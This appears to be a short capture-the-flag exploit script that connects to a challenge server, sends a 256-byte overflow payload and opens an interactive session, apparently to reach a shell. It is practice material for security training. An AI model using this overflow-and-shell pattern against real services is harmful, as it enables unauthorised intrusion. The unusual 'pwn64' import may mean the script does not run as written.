from pwn64 import *
p=remote("pwn.challenge.ctf.show",28141)
payload = b'a'*256
p.sendline(payload)
p.interactive()